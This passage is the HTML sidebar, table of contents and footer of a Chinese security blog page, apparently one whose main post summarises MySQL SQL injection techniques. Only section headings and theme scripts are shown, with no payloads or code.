class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile" href="/categories/Firewall/"><span class="level-start"><span class="level-item">Firewall</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Note/"><span class="level-start"><span class="level-item">Note</span></span><span class="level-end"><span class="level-item tag">4</span></span></a><ul><li><a class="level is-mobile" href="/categories/Note/PE/"><span class="level-start"><span class="level-item">PE</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Note/SQL/"><span class="level-start"><span class="level-item">SQL</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Note/WEB/"><span class="level-start"><span class="level-item">WEB</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li></ul></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/App/"><span class="tag">App</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/C/"><span class="tag">C</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ClientIP/"><span class="tag">ClientIP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/InformationLeakage/"><span class="tag">InformationLeakage</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Kivy/"><span class="tag">Kivy</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/LKM/"><span class="tag">LKM</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PE/"><span class="tag">PE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Python/"><span class="tag">Python</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQL/"><span class="tag">SQL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WEB/"><span class="tag">WEB</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows/"><span class="tag">Windows</span><span class="tag">1</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#常用信息"><span class="level-left"><span class="level-item">常用信息</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#测试-payload-万能密码"><span class="level-left"><span class="level-item">测试 payload(万能密码)</span></span></a></li><li><a class="level is-mobile" href="#注释符号"><span class="level-left"><span class="level-item">注释符号</span></span></a></li><li><a class="level is-mobile" href="#常用运算符"><span class="level-left"><span class="level-item">常用运算符</span></span></a></li><li><a class="level is-mobile" href="#常用函数和语句"><span class="level-left"><span class="level-item">常用函数和语句</span></span></a></li><li><a class="level is-mobile" href="#字符串拼接"><span class="level-left"><span class="level-item">字符串拼接</span></span></a></li></ul></li><li><a class="level is-mobile" href="#数据库信息的获取"><span class="level-left"><span class="level-item">数据库信息的获取</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#数据库名"><span class="level-left"><span class="level-item">数据库名</span></span></a></li><li><a class="level is-mobile" href="#表名"><span class="level-left"><span class="level-item">表名</span></span></a></li><li><a class="level is-mobile" href="#列名"><span class="level-left"><span class="level-item">列名</span></span></a></li><li><a class="level is-mobile" href="#表中的数据"><span class="level-left"><span class="level-item">表中的数据</span></span></a></li><li><a class="level is-mobile" href="#查询连接过数据库的所有-IP-和其连接过的总次数"><span class="level-left"><span class="level-item">查询连接过数据库的所有 IP 和其连接过的总次数</span></span></a></li><li><a class="level is-mobile" href="#查看-SQL-语句执行的记录"><span class="level-left"><span class="level-item">查看 SQL 语句执行的记录</span></span></a></li></ul></li><li><a class="level is-mobile" href="#注入方法"><span class="level-left"><span class="level-item">注入方法</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#union-联合注入"><span class="level-left"><span class="level-item">union 联合注入</span></span></a></li><li><a class="level is-mobile" href="#堆叠注入"><span class="level-left"><span class="level-item">堆叠注入</span></span></a></li><li><a class="level is-mobile" href="#盲注"><span class="level-left"><span class="level-item">盲注</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#布尔盲注"><span class="level-left"><span class="level-item">布尔盲注</span></span></a></li><li><a class="level is-mobile" href="#时间盲注"><span class="level-left"><span class="level-item">时间盲注</span></span></a></li></ul></li><li><a class="level is-mobile" href="#报错注入"><span class="level-left"><span class="level-item">报错注入</span></span></a></li><li><a class="level is-mobile" href="#二次注入"><span class="level-left"><span class="level-item">二次注入</span></span></a></li><li><a class="level is-mobile" href="#limit-注入"><span class="level-left"><span class="level-item">limit 注入</span></span></a></li><li><a class="level is-mobile" href="#update-注入"><span class="level-left"><span class="level-item">update 注入</span></span></a></li><li><a class="level is-mobile" href="#insert-注入"><span class="level-left"><span class="level-item">insert 注入</span></span></a></li><li><a class="level is-mobile" href="#ORDER-BY-注入"><span class="level-left"><span class="level-item">ORDER BY 注入</span></span></a></li><li><a class="level is-mobile" href="#GROUP-BY-注入"><span class="level-left"><span class="level-item">GROUP BY 注入</span></span></a></li><li><a class="level is-mobile" href="#读写文件"><span class="level-left"><span class="level-item">读写文件</span></span></a></li><li><a class="level is-mobile" href="#无列名盲注"><span class="level-left"><span class="level-item">无列名盲注</span></span></a></li></ul></li><li><a class="level is-mobile" href="#常见绕过"><span class="level-left"><span class="level-item">常见绕过</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#and-或-or-被过滤-拦截"><span class="level-left"><span class="level-item">and 或 or 被过滤/拦截</span></span></a></li><li><a class="level is-mobile" href="#结果中的关键字被过滤"><span class="level-left"><span class="level-item">结果中的关键字被过滤</span></span></a></li><li><a class="level is-mobile" href="#空格被过滤-拦截"><span class="level-left"><span class="level-item">空格被过滤/拦截</span></span></a></li><li><a class="level is-mobile" href="#单双引号"><span class="level-left"><span class="level-item">单双引号</span></span></a></li><li><a class="level is-mobile" href="#逗号被过滤"><span class="level-left"><span class="level-item">逗号被过滤</span></span></a></li><li><a class="level is-mobile" href="#等号或-like-被过滤"><span class="level-left"><span class="level-item">等号或 like 被过滤</span></span></a></li><li><a class="level is-mobile" href="#if-被过滤"><span class="level-left"><span class="level-item">if 被过滤</span></span></a></li><li><a class="level is-mobile" href="#union被过滤"><span class="level-left"><span class="level-item">union被过滤</span></span></a></li><li><a class="level is-mobile" href="#数字被过滤"><span class="level-left"><span class="level-item">数字被过滤</span></span></a></li><li><a class="level is-mobile" href="#HANDLER-语句代替SELECT查询"><span class="level-left"><span class="level-item">HANDLER 语句代替SELECT查询</span></span></a></li></ul></li><li><a class="level is-mobile" href="#附录"><span class="level-left"><span class="level-item">附录</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Mysql的基本操作"><span class="level-left"><span class="level-item">Mysql的基本操作</span></span></a></li><li><a class="level is-mobile" href="#Sqlmap的使用"><span class="level-left"><span class="level-item">Sqlmap的使用</span></span></a></li><li><a class="level is-mobile" href="#SQL-fuzz-字典"><span class="level-left"><span class="level-item">SQL fuzz 字典</span></span></a></li></ul></li><li><a class="level is-mobile" href="#参考"><span class="level-left"><span class="level-item">参考</span></span></a></li></ul></div></div><style>#toc .menu-list>li>a.is-active+.menu-list{display:block}#toc .menu-list>li>a+.menu-list{display:none}</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time datetime="2021-05-27T02:47:15.000Z">2021-05-27</time></p><p class="title"><a href="/2021/05/27/A-Simple-Packet-Filtering-Firewall-in-Linux/">A Simple Packet Filtering Firewall in Linux(Linux下的包过滤防火墙)</a></p><p class="categories"><a href="/categories/Firewall/">Firewall</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2021-05-16T11:56:48.000Z">2021-05-16</time></p><p class="title"><a href="/2021/05/16/SQL_Inject/">SQL注入总结(MySQL)</a></p><p class="categories"><a href="/categories/Note/">Note</a> / <a href="/categories/Note/SQL/">SQL</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2021-05-04T08:15:21.000Z">2021-05-04</time></p><p class="title"><a href="/2021/05/04/PE_FILE/">PE文件</a></p><p class="categories"><a href="/categories/Note/">Note</a> / <a href="/categories/Note/PE/">PE</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2021-04-23T00:56:00.000Z">2021-04-23</time></p><p class="title"><a href="/2021/04/23/Kivy-Kivymd-Learn-APP/">基于 Kivy/Kivymd 开发的成语学习APP</a></p><p class="categories"><a href="/categories/Application/">Application</a> / <a href="/categories/Application/Kivy/">Kivy</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2021-02-03T13:00:31.000Z">2021-02-03</time></p><p class="title"><a href="/2021/02/03/WebsiteInformationLeakage/">网站信息泄露</a></p><p class="categories"><a href="/categories/Note/">Note</a> / <a href="/categories/Note/WEB/">WEB</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/CSHF_LOGO.png" alt="CSHF" height="28"></a><p class="is-size-7"><span>&copy; 2021 CSHF</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("zh-CN")</script><script>var IcarusThemeSettings={article:{highlight:{clipboard:!1,fold:"unfolded"}}}</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load",()=>{window.cookieconsent.initialise({type:"info",theme:"edgeless",static:!1,position:"bottom-left",content:{message:"此网站使用Cookie来改善您的体验。",dismiss:"知道了！",allow:"允许使用Cookie",deny:"拒绝",link:"了解更多",policy:"Cookie政策",href:"https://www.cookiesandyou.com/"},palette:{popup:{background:"#edeff5",text:"#838391"},button:{background:"#4b81e8"}}})})</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load",()=>{"function"==typeof $.fn.lightGallery&&$(".article").lightGallery({selector:".gallery-item"}),"function"==typeof $.fn.justifiedGallery&&($(".justified-gallery > p > .gallery-item").length&&$(".justified-gallery > p > .gallery-item").unwrap(),$(".justified-gallery").justifiedGallery())})</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener("DOMContentLoaded",function(){loadInsight({contentUrl:"/content.json"},{hint:"想要查找什么...",untitled:"(无标题)",posts:"文章",pages:"页面",categories:"分类",tags:"标签"})})</script></body></html>